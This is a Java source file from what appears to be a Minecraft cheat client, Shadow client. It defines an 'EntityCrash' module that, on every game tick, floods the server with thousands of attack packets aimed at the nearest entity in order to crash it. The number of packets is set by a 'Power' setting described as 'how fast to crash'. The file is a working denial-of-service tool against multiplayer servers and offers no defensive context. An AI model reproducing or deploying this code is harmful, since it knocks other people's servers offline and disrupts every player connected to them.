/*
 * Copyright (c) Shadow client, Saturn5VFive and contributors 2022. All rights reserved.
 */

package net.shadow.client.feature.module.impl.crash;

import net.minecraft.client.util.math.MatrixStack;
import net.minecraft.entity.Entity;
import net.minecraft.network.packet.c2s.play.PlayerInteractEntityC2SPacket;
import net.shadow.client.feature.config.DoubleSetting;
import net.shadow.client.feature.module.Module;
import net.shadow.client.feature.module.ModuleType;

public class EntityCrash extends Module {

    final DoubleSetting repeat = this.config.create(new DoubleSetting.Builder(2000).min(500).max(10000).name("Power").description("how fast to crash").get());
    Entity target = null;

    public EntityCrash() {
        super("EntityCrash", "Crash the server by punching entities", ModuleType.CRASH);
    }

    public Entity getNearestLikelyEntity() {
        for (Entity ent : client.world.getEntities()) {
            if (distanceTo(ent) > 5 || ent == client.player) continue;
            return ent;
        }
        return null;
    }

    public double distanceTo(Entity e) {
        float f = (float) (client.player.getX() - e.getX());
        float g = (float) (client.player.getY() - e.getY());
        float h = (float) (client.player.getZ() - e.getZ());
        return Math.sqrt(f * f + g * g + h * h);
    }

    @Override
    public void tick() {
        target = getNearestLikelyEntity();
        if (target == null) return;
        for (int i = 0; i < repeat.getValue(); i++) {
            client.player.networkHandler.sendPacket(PlayerInteractEntityC2SPacket.attack(target, client.player.isSneaking()));
        }
    }

    @Override
    public void enable() {
    }

    @Override
    public void disable() {
    }

    @Override
    public String getContext() {
        return null;
    }

    @Override
    public void onWorldRender(MatrixStack matrices) {

    }

    @Override
    public void onHudRender() {

    }
}
